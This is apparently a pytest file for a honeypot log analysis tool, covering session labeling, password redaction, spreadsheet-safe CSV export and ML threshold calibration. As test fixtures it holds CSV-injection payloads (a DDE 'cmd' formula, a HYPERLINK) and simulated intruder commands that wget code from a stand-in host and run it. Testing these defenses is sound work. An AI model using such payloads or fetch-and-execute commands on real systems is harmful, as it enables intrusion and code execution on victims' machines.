import csv
import io
import json
import random
import sqlite3
from datetime import datetime, timedelta, timezone

import pytest

from app import create_app
from aegis import labeled_eval, labels
from aegis.engine import validate_config

BASE = datetime(2026, 1, 1, tzinfo=timezone.utc)


def raw(second, session, **fields):
    return dict(timestamp=(BASE + timedelta(seconds=second)).isoformat(), eventid="cowrie.session.connect", sensor="hp",
                session=session, src_ip="192.0.2.70") | fields


def jsonl(records):
    return ("\n".join(json.dumps(r) for r in records) + "\n").encode()


def make_client(path, **kw):
    app = create_app(path, **kw)
    app.config["TESTING"] = True
    client = app.test_client()
    client.get("/")
    with client.session_transaction() as session:
        client.environ_base["HTTP_X_AEGIS_CSRF"] = session["csrf"]
    return client


@pytest.fixture
def client(tmp_path):
    return make_client(tmp_path / "aegis.sqlite3")


def upload(client, records):
    response = client.post("/api/import", data={"file": (io.BytesIO(jsonl(records)), "x.jsonl")})
    assert response.status_code == 200, response.get_json()


INTRUSION = [raw(0, "in"), raw(1, "in", eventid="cowrie.login.success", username="root", password="hunter2",
                                  message="login attempt [root/hunter2] succeeded"),
             raw(2, "in", eventid="cowrie.command.input", input="uname -a")]
SCAN = [raw(100, "scan"), raw(101, "scan", eventid="cowrie.client.version", version="SSH-2.0-Go"),
        raw(102, "scan", eventid="cowrie.session.closed", duration_ms=0)]


# --- Labels -----------------------------------------------------------------------------------------

def test_labels_are_audited_and_validated(client):
    upload(client, INTRUSION + SCAN)
    put = lambda body, session="in": client.put(f"/api/v1/sessions/{session}/label?source=imported", json=body)
    assert put({"label": "malicious", "types": ["discovery"], "note": "Logged in and ran uname."}).status_code == 200
    assert put({"label": "benign"}, "scan").status_code == 200
    assert put({"label": "malicious", "types": ["discovery", "credential_access"]}).status_code == 200
    timeline = client.get("/api/v1/sessions/in/timeline?source=imported").get_json()
    assert timeline["label"]["label"] == "malicious" and timeline["label"]["types"] == ["credential_access", "discovery"]
    assert [(h["before"] or {}).get("label") for h in timeline["label_history"]] == ["malicious", None]
    assert timeline["label_history"][0]["actor"] == "local-analyst"
    assert all(set(h) == {"actor", "changed_at", "before", "after"} for h in timeline["label_history"])  # no raw columns leak
    assert put({"label": None}).get_json()["label"] is None
    assert len(client.get("/api/v1/sessions/in/timeline?source=imported").get_json()["label_history"]) == 3
    for bad in ({"label": "evil"}, {"label": "benign", "types": ["nonsense"]}, {"label": "benign", "note": "x" * 501}, None):
        assert client.put("/api/v1/sessions/scan/label?source=imported", data=json.dumps(bad), content_type="application/json").status_code == 400
    assert put({"label": "benign"}, "missing").status_code == 404
    assert client.get("/api/v1/labels?source=imported").get_json()["counts"] == {"malicious": 0, "benign": 1}


def test_suggestions_are_reviewable_hints(client):
    upload(client, INTRUSION + SCAN)
    intrusion = client.get("/api/v1/sessions/in/timeline?source=imported").get_json()["suggestion"]
    assert intrusion["label"] == "malicious" and intrusion["types"] == ["discovery"] and "circular" in intrusion["basis"]
    assert client.get("/api/v1/sessions/scan/timeline?source=imported").get_json()["suggestion"]["label"] == "benign"
    upload(client, [raw(500, "quiet", eventid="cowrie.login.success", username="pi")])
    assert client.get("/api/v1/sessions/quiet/timeline?source=imported").get_json()["suggestion"] is None
    assert client.get("/api/v1/labels?source=imported").get_json()["labels"] == []  # never applied automatically


def test_session_ids_shared_by_sensors_must_be_disambiguated(client):
    upload(client, [raw(0, "dup", sensor="a"), raw(1, "dup", sensor="b")])
    assert client.get("/api/v1/sessions/dup/timeline?source=imported").get_json()["ambiguous"] is True
    assert client.put("/api/v1/sessions/dup/label?source=imported", json={"label": "benign"}).status_code == 400
    assert client.put("/api/v1/sessions/dup/label?source=imported&sensor=a", json={"label": "benign"}).status_code == 200


# --- Provenance and original records ----------------------------------------------------------------

def test_original_records_never_show_passwords(client):
    upload(client, INTRUSION)
    login = next(e for e in client.get("/api/events?source=imported").get_json()["events"] if e["eventid"] == "cowrie.login.success")
    response = client.get(f"/api/v1/events/{login['id']}/provenance?source=imported")
    body = response.get_json()
    assert "hunter2" not in response.text
    assert body["original"]["password"] == "[redacted: 7 characters]" and "redacted" in body["original"]["message"]
    assert body["provenance"][0]["ingestion_mode"] == "import" and len(body["provenance"][0]["raw_sha256"]) == 64
    assert client.get(f"/api/v1/events/{login['id']}/provenance?source=demo").status_code == 404
    assert client.get("/api/v1/events/../../etc/provenance").status_code in (400, 404)
    assert client.get("/api/v1/events/nothex/provenance?source=imported").status_code == 400


def test_events_without_raw_record_say_so(client):
    store = client.application.extensions["store"]
    from aegis.canonical import normalize
    store.ingest([normalize(raw(0, "legacy"), "imported")])
    event = client.get("/api/events?source=imported").get_json()["events"][0]
    body = client.get(f"/api/v1/events/{event['id']}/provenance?source=imported").get_json()
    assert body["original"] is None and body["provenance"] == []


# --- CSV export -------------------------------------------------------------------------------------

def test_csv_export_is_spreadsheet_safe(client):
    hostile = ['=HYPERLINK("http://x.example","click")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1,2)", "line1\nline2", "‮txt.exe", "plain"]
    upload(client, [raw(n, f"c{n}", eventid="cowrie.command.input", input=text) for n, text in enumerate(hostile)])
    response = client.get("/api/v1/events/export.csv?source=imported")
    assert response.mimetype == "text/csv" and "attachment" in response.headers["Content-Disposition"]
    rows = list(csv.DictReader(io.StringIO(response.text)))
    inputs = [r["input"] for r in rows]
    assert inputs[:4] == ["'" + h for h in hostile[:4]]
    assert inputs[4] == "line1\\u000aline2" and inputs[5] == "\\u202etxt.exe" and inputs[6] == "plain"
    assert all(r["dataset"] == "imported" and r["dataset_label"] == "uploaded historical telemetry" for r in rows)
    assert len(response.text.splitlines()) == len(hostile) + 1  # no embedded newlines


def test_csv_export_respects_filters_bounds_and_synthetic_labels(client, monkeypatch):
    import app as module
    client.post("/api/replay")
    demo = list(csv.DictReader(io.StringIO(client.get("/api/v1/events/export.csv?event_type=auth_failure").text)))
    assert len(demo) == 6 and all("synthetic" in r["dataset_label"] for r in demo)
    monkeypatch.setattr(module, "CSV_LIMIT", 5)
    response = client.get("/api/v1/events/export.csv")
    assert response.status_code == 400 and "narrow the filters" in response.get_json()["error"]


# --- Labeled dataset export and calibration ---------------------------------------------------------

def test_labeled_export_round_trips_through_evaluation(tmp_path, client, capsys):
    upload(client, INTRUSION + SCAN + [raw(300, "other", eventid="cowrie.client.version", version="x")])
    client.put("/api/v1/sessions/in/label?source=imported", json={"label": "malicious", "types": ["discovery"]})
    client.put("/api/v1/sessions/scan/label?source=imported", json={"label": "benign"})
    db = client.application.extensions["store"].path
    out = tmp_path / "dataset"
    assert labels.main(["export", "--db", db, "--dataset", "imported", "--out", str(out)]) == 0
    events = (out / "events.jsonl").read_text()
    assert "hunter2" not in events and len(events.splitlines()) == 7  # all events, labeled or not
    manifest = json.loads((out / "manifest.json").read_text())
    assert manifest["counts"] == {"events": 7, "labeled_sessions": 2, "malicious": 1, "benign": 1, "events_without_raw_record": 0}
    assert manifest["synthetic"] is False and "Do not publish" in manifest["license"]
    result = labeled_eval.evaluate_dataset(out, validate_config({}))
    assert result["sessions"] == {"evaluated": 2, "malicious": 1, "benign": 1, "unlabeled_excluded": 1}
    assert result["detectors"]["DISC-001"]["confusion"]["tp"] == 1
    assert labels.main(["export", "--db", db, "--dataset", "imported", "--out", str(out)]) == 2  # never overwrites
    assert labels.main(["export", "--db", db, "--dataset", "live", "--out", str(tmp_path / "empty")]) == 2
    assert "No labeled sessions" in capsys.readouterr().err


def scanner_and_intruders(start, count, intruders, seed):
    rng, records, truth = random.Random(seed), [], {}
    for n in range(count):
        t, s = start + n * 300, f"s{start}-{n}"
        if n in intruders:
            records += [raw(t, s), raw(t + 1, s, eventid="cowrie.login.success", username="root")]
            records += [raw(t + 2 + k, s, eventid="cowrie.command.input", input=f"wget http://x.example/{k}; chmod +x a; ./a #{'x' * rng.randint(50, 400)}") for k in range(rng.randint(4, 12))]
            records.append(raw(t + 200, s, eventid="cowrie.session.closed", duration_ms=rng.randint(60000, 400000)))
            truth[s] = "malicious"
        else:
            records += [raw(t, s), raw(t + 1, s, eventid="cowrie.client.version", version="SSH-2.0-Go"),
                        raw(t + 2, s, eventid="cowrie.session.closed", duration_ms=rng.randint(0, 900))]
            truth[s] = "benign"
    return records, truth


def write_labeled(path, records, truth, synthetic=False):
    path.mkdir()
    (path / "manifest.json").write_text(json.dumps({"name": path.name, "version": "1", "synthetic": synthetic}))
    (path / "events.jsonl").write_bytes(jsonl(records))
    (path / "labels.jsonl").write_text("\n".join(json.dumps({"session": s, "label": l}) for s, l in truth.items()))


def test_calibration_picks_a_threshold_on_later_labeled_data(tmp_path):
    pytest.importorskip("sklearn")
    from aegis import ml
    train_records, _ = scanner_and_intruders(0, 120, {7, 40, 81}, 1)
    later_records, later_truth = scanner_and_intruders(10_000_000, 60, set(range(0, 60, 6)), 2)
    db = tmp_path / "db.sqlite3"
    upload(make_client(db), train_records)
    assert ml.main(["train", "--db", str(db), "--dataset", "imported", "--until", "2026-03-01T00:00:00Z", "--out", str(tmp_path / "base")]) == 0
    write_labeled(tmp_path / "cal", later_records, later_truth)
    assert ml.main(["calibrate", "--model", str(tmp_path / "base"), "--labeled", str(tmp_path / "cal"), "--test-after", "2026-03-01T00:00:00Z",
                    "--out", str(tmp_path / "cli")]) == 0
    assert ml.load(tmp_path / "cli", 90).manifest["calibration"]["objective"] == "f1"
    early = tmp_path / "early"
    write_labeled(early, train_records, {s: "benign" for s in {r["session"] for r in train_records}} | {"s0-7": "malicious"})
    with pytest.raises(ValueError, match="overlap the training window"):
        ml.calibrate(tmp_path / "base", early, tmp_path / "bad", validate_config({}))
    result = ml.calibrate(tmp_path / "base", tmp_path / "cal", tmp_path / "f1", validate_config({}), "2026-03-01T00:00:00.000000+00:00")
    chosen = result["calibration"]["chosen"]
    assert chosen["f1"] >= 0.9 and result["calibration"]["malicious"] == 10
    assert result["model_version"] != json.loads((tmp_path / "base" / "model.json").read_text())["model_version"]
    assert result["calibration"]["calibrated_from"].startswith("if-") and any("unstable" in w for w in result["calibration"]["warnings"])
    assert ml.load(tmp_path / "f1", 90).threshold == chosen["threshold"]  # the new version verifies and uses the new threshold
    precise = ml.calibrate(tmp_path / "base", tmp_path / "cal", tmp_path / "p", validate_config({}), "2026-03-01T00:00:00.000000+00:00", "precision:1.0")
    assert precise["calibration"]["chosen"]["precision"] == 1.0
    with pytest.raises(ValueError, match="objective"):
        ml.calibrate(tmp_path / "base", tmp_path / "cal", tmp_path / "q", validate_config({}), None, "accuracy")


# --- Real-data evaluation pipeline ------------------------------------------------------------------

def test_criteria_labels_follow_the_documented_rules():
    from aegis.canonical import normalize
    from aegis.realdata import criteria_label
    s = lambda *records: [normalize(r, "imported") for r in records]
    assert criteria_label(s(*INTRUSION))[0] == "malicious"
    assert criteria_label(s(*SCAN)) == ("benign", [], "no interaction")
    assert criteria_label(s(raw(0, "q"), raw(1, "q", eventid="cowrie.login.success", username="pi")))[0] is None  # login only: excluded
    brute = [raw(n, "b", eventid="cowrie.login.failed", username="root") for n in range(5)]
    assert criteria_label(s(*brute)) == ("malicious", ["credential_access"], "meets a malicious criterion")
    fetch = INTRUSION + [raw(3, "in", eventid="cowrie.command.input", input="wget http://x.example/a")]
    assert criteria_label(s(*fetch))[1] == ["discovery", "intrusion_sequence", "transfer"]


def test_realdata_pipeline_end_to_end(tmp_path):
    pytest.importorskip("sklearn")
    from aegis import realdata
    records, _ = scanner_and_intruders(0, 140, {20, 70, 100, 130}, 5)
    logs = tmp_path / "logs" / "ip-host"  # the per-host folder aws s3 sync creates
    logs.mkdir(parents=True)
    (logs / "cowrie.json.2026-01-01").write_bytes(jsonl(records[: len(records) // 2]))
    (logs / "cowrie.json").write_bytes(jsonl(records[len(records) // 2:]))
    (logs / ".gitignore").write_text("")
    assert [f.name for f in realdata.read_logs([tmp_path / "logs"])] == ["cowrie.json", "cowrie.json.2026-01-01"]
    report = realdata.run([tmp_path / "logs"], tmp_path / "out", validate_config({}), notes=["Fixture data."])
    assert report["data"]["sessions"] == 140 and report["labels"]["counts"]["malicious"] == 4
    assert sum(f["test_sessions"] for f in report["backtest"]["folds"]) == 80  # every session after the first 60
    assert report["backtest"]["ml"]["ci95"]["recall"] is not None
    assert report["limitations"][0] == "Fixture data." and (tmp_path / "out" / "report.md").read_text().startswith("# Aegis real-data evaluation")
    store_labels = sqlite3.connect(tmp_path / "out" / "work" / "evaluation.sqlite3").execute("SELECT DISTINCT actor FROM session_labels").fetchall()
    assert store_labels == [("criteria-v1 (automated)",)]  # never presented as human labels
    with pytest.raises(FileExistsError):
        realdata.run([tmp_path / "logs"], tmp_path / "out", validate_config({}))


def test_labeling_task_is_independent_and_minimal(tmp_path, client):
    upload(client, INTRUSION + SCAN)
    client.put("/api/v1/sessions/scan/label?source=imported", json={"label": "benign"})
    db = client.application.extensions["store"].path
    result = labels.task(db, "imported", tmp_path / "task")
    assert result["sessions"] == 2
    text = (tmp_path / "task" / "sessions.jsonl").read_text()
    assert "hunter2" not in text and "192.0.2.70" not in text  # no passwords, no source addresses
    assert '"uname -a"' in text and "cowrie.login.success" in text
    instructions = (tmp_path / "task" / "INSTRUCTIONS.md").read_text()
    assert "Never run" in instructions and not any(rule in instructions + text for rule in ("DISC-001", "INT-001", "AUTH-", "Suggested"))
    assert labels.task(db, "imported", tmp_path / "rest", skip_labeled=True)["sessions"] == 1


def test_importing_outside_labels_keeps_human_labels(tmp_path, client, capsys):
    upload(client, INTRUSION + SCAN + [raw(300, "late", eventid="cowrie.login.success", username="pi")])
    client.put("/api/v1/sessions/in/label?source=imported", json={"label": "malicious", "types": ["discovery"]})
    db = client.application.extensions["store"].path
    answers = tmp_path / "labels.jsonl"
    answers.write_text("\n".join(json.dumps(x) for x in [
        {"session": "in", "sensor": "hp", "label": "benign", "types": [], "note": "should not replace the human label"},
        {"session": "scan", "sensor": "hp", "label": "benign", "types": [], "note": "scanner"},
        {"session": "late", "sensor": "hp", "label": "unsure", "types": []},
        {"session": "ghost", "sensor": "hp", "label": "benign", "types": []},
        {"session": "scan", "sensor": "hp", "label": "evil"}, "not json"]))
    assert labels.main(["import", str(answers), "--db", db, "--dataset", "imported", "--actor", "codex"]) == 0
    summary = json.loads(capsys.readouterr().out)
    assert summary == {"imported": 1, "unsure": 1, "kept_existing": 1, "unknown_session": 1, "invalid": 2}
    timeline = lambda s: client.get(f"/api/v1/sessions/{s}/timeline?source=imported").get_json()["label"]
    assert timeline("in")["label"] == "malicious" and timeline("in")["actor"] == "local-analyst"
    assert timeline("scan")["actor"] == "codex" and timeline("late") is None
    assert labels.main(["import", str(answers), "--db", db, "--dataset", "imported", "--actor", "bad actor!"]) == 2
